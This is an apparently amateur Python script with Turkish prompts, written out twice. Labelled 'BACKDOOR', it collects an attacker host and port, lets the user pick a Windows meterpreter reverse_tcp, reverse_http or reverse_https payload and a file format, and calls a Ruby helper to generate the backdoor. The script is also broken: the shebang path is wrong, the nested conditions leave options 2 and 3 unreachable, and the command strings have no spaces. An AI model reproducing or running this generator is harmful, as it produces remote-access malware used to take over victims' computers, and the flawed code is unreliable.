#!/use/bin/env python
#-- coding: utf-8 --

import os
import smtplib
import getpass
import sys
import random

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet BACKDOOR ")
print("Gelecegi Belirliyen Bizler Yaptıklarımızın Arkasında Durmalıyız !")

LHOST = raw_input ('Local veya Dış İp Girin : ')
LPORT = raw_input ('Port No Girin : ')

print("""
Payload Lİstesi

1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https


""")
PAYLOAD = raw_input ('Lütfen Payload Seçin :')

print(""" Seçilebilcek uzantı Formatları:
raw, amd, vba, vbs, war, exe, java, js, js-rd32, php, hta, cfm, aspx, lnk, sct
""")
UZ = raw_input ('Lütfen Uzantı Formatı Seçin :')

if(PAYLOAD == "1"):
     os.system("./arkakapı.rb -i" + LHOST + "-p" + LPORT + "windows/meterpreter/reverse_tcp" + "-t" + UZ )
     if (PAYLOAD == "2"):
          os.system("./arkakapı.rb -i" + LHOST + "-p" + LPORT + "windows/meterpreter/reverse_http" + "-t" + UZ )
          if (PAYLOAD == "3"):
               os.system("./arkakapı.rb -i" + LHOST + "-p" + LPORT + "windows/meterpreter/reverse_https" + "-t" + UZ )#!/use/bin/env python
#-- coding: utf-8 --

import os
import smtplib
import getpass
import sys
import random

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet BACKDOOR ")
print("Gelecegi Belirliyen Bizler Yaptıklarımızın Arkasında Durmalıyız !")

LHOST = raw_input ('Local veya Dış İp Girin : ')
LPORT = raw_input ('Port No Girin : ')

print("""
Payload Lİstesi

1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https


""")
PAYLOAD = raw_input ('Lütfen Payload Seçin :')

print(""" Seçilebilcek uzantı Formatları:
raw, amd, vba, vbs, war, exe, java, js, js-rd32, php, hta, cfm, aspx, lnk, sct
""")
UZ = raw_input ('Lütfen Uzantı Formatı Seçin :')

if(PAYLOAD == "1"):
     os.system("./arkakapı.rb -i" + LHOST + "-p" + LPORT + "windows/meterpreter/reverse_tcp" + "-t" + UZ )
     if (PAYLOAD == "2"):
          os.system("./arkakapı.rb -i" + LHOST + "-p" + LPORT + "windows/meterpreter/reverse_http" + "-t" + UZ )
          if (PAYLOAD == "3"):
               os.system("./arkakapı.rb -i" + LHOST + "-p" + LPORT + "windows/meterpreter/reverse_https" + "-t" + UZ )
